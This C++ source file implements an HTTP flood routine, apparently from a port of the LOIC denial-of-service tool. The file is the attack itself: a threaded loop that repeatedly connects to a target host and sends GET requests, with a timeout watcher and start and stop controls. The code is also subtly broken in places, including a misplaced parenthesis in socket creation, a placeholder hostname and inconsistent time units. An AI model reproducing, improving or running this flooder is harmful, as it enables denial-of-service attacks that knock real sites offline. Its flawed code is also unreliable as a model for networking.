/*
 * HTTPFlooder.cpp
 *
 *  Created on: Dec 7, 2012
 *      Author: ivan
 */


#include "HTTPFlooder.h"

namespace loic {

	void HTTPFlooder::work()
	{
		try
		{
			int i = 0;
			while(this->isFlooding())
			{
				this->state = readyState;
				//tick
				lastAction = time(NULL)/3600;

				int socketHandle;
				if((socketHandle = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){

					close(socketHandle);
					std::cerr<<i<<" couldn't create socket socket"<<std::endl;
				}

				this->state = connectingState;

				fcntl(socketHandle,F_SETFL,O_NONBLOCK);


				/* socket work */

				struct sockaddr_in remoteSocketInfo;

				std::string remoteHost = "from the ip address";

				bzero(&remoteSocketInfo, sizeof(sockaddr_in)); //clear memory


				//using hostname
				if(hostname)
				{
					struct hostent *hPtr;
					if((hPtr = gethostbyname(remoteHost.c_str())) == NULL)
					{
						std::cerr<<i<<" System DNS name resolution not configured properly."<<std::endl;
						std::cerr<<i<<" Error number: "<< ECONNREFUSED<<std::endl;

					}

					//Load system information for remote socket server into socket data structure
					memcpy((char*) & remoteSocketInfo.sin_addr, hPtr->h_addr,hPtr->h_length);
				}
				else
				{
					//using ip address
					remoteSocketInfo.sin_addr.s_addr = inet_addr(ip.c_str());
				}

				remoteSocketInfo.sin_family = AF_INET;
				remoteSocketInfo.sin_port = htons((u_short)port);
				if((connect(socketHandle, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
				{
					close(socketHandle);
					std::cerr<<i<<" could not connect socket\n";

				}

				this->state = requestingState;

				//socket send
				char buf[512];
				std::stringstream stream("");
				stream<<"GET /"<<this->subsite<<" HTTP/1.0\n\n\n";
				strcpy(buf,stream.str().c_str());
				send(socketHandle,buf,strlen(buf)+1,0);


				this->state = downloadingState;
				requested++;

				if(resp)
				{
					//socket receive
					char recvBuf[64];
					int rc  = recv(socketHandle, &recvBuf, 64,0);  //0 for no flags
					if(rc == 0)
					{
						std::cerr<<i<<" ERROR! Socket closed"<<std::endl;
					}
					else if(rc == -1)
					{
						std::cerr<<i<<" ERROR! Socket error"<<std::endl;
						close(socketHandle);
					}
					else
					{
						//successfull
						std::cout<<recvBuf<<std::endl;

					}

				}

				this->state = completedState;
				downloaded++;


				if(delay>0)
				{
					boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
				}
				i++;
			}
		}
		catch(std::exception & exe)
		{
			std::cerr<<exe.what()<<std::endl;
		}
		flooding = false;
	}

	void HTTPFlooder::checkTimeOut()
	{
		while(flooding)
		{
			time_t now = time(NULL)/3600;	//time since epoch

			if(difftime(now,lastAction)>timeout)
			{
				flooding = false;
				this->failed++;
				this->state = failedState;
				std::cerr<<"Error! TIMED OUT\n";
			}
			boost::this_thread::sleep(boost::posix_time::milliseconds(100));
		}
	}
	void HTTPFlooder::Start()
	{
		flooding = true;
		lastAction = time(NULL);

		//can use bind as well
		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);

		unsigned int numThreads = 1;
		for(unsigned int i = 0; i<numThreads;i++)
		{
			boost::thread thread(&loic::HTTPFlooder::work,this);
		}
	}


	void HTTPFlooder::Stop()
	{
		flooding = false;
	}

} /* namespace loic */
